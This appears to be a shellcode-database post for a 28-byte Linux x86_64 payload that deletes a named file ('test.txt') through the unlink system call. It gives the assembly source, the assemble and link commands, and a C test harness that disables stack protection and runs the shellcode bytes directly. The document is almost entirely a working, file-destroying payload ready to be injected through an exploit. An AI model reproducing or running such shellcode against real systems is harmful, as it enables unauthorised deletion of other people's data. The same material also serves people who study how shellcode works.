;Title: Linux/x86_64 - delete
;Author: Aron Mihaljevic
;Architecture: Linux x86_64
;Shellcode Length:  28 bytes


This shellcode deletes file declared in "fname"


==================ASSEMBLY ========================================

global _start

section .text

_start:

        jmp short _file


delete:
        push 87                             ;sys_unlink
        pop rax
        pop rdi                             ;fname
        syscall

exit:
        xor rax,        rax
        mov al,         60                  ;sys_exit
        syscall


_file:

call delete
fname: db "test.txt"



=======Generate Shellcode==========================================
nasm -felf64 delete.nasm -o delete.o
ld delete.o -o delete



========C program ================================================
//gcc -fno-stack-protector -z execstack delete.c

#include <stdio.h>
#include <string.h>

char sh[]="\xeb\x0d\x6a\x57\x58\x5f\x0f\x05\x48"
          "\x31\xc0\xb0\x3c\x0f\x05\xe8\xee\xff"
          "\xff\xff\x74\x65\x73\x74\x2e\x74\x78\x74";


void main(int argc, char **argv)
{
        printf("Shellcode Length: %d\n", strlen (sh));
        int (*func)();
        func = (int (*)()) sh;
        (int)(*func)();
}